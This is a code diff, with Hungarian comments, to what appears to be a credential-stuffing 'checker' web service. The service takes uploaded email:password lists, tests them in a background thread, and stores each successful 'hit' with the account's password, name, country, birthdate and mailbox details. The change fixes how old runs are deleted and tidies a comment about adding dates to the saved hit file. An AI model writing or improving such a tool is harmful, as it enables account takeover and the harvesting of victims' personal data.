@@ -120,9 +120,10 @@ async def start_checker(file: UploadFile, keyword: str = Form(...), speed: float
     if not lines: raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")
     
     user_id = str(current_user["_id"])
-    await delete_old_runs(user_id)
     
+    # 🔴 ITT JAVÍTOTTAM A TÖRLÉST! Előbb létrehozzuk az újat, majd töröljük a régit 🔴
     run_id = await create_run(user_id, keyword, len(lines))
+    await delete_old_runs(user_id, run_id)
     
     with stop_lock: stop_flags[user_id] = asyncio.Event()
     threading.Thread(target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, speed)), daemon=True).start()
@@ -159,7 +160,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         if result["status"] == "hit":
             hits += 1
             d = result["data"]
-            # 🟢 ITT KERÜLT BE A DÁTUM A KIMENTETT TXT FÁJLBA! 🟢
+            # 🟢 BEKERÜLT A DÁTUM A KIMENTETT TXT FÁJLBA 🟢
             lt = f"{d['email']}:{d['password']} | Country={d['country']} | Name={d['name']} | Birthdate={d['birthdate']} | Mails={d['mails']} | LastMail={d['date']}"
             await add_result_to_run(run_id, "hit", lt)
             await add_result_details_to_run(run_id, "hit", d)
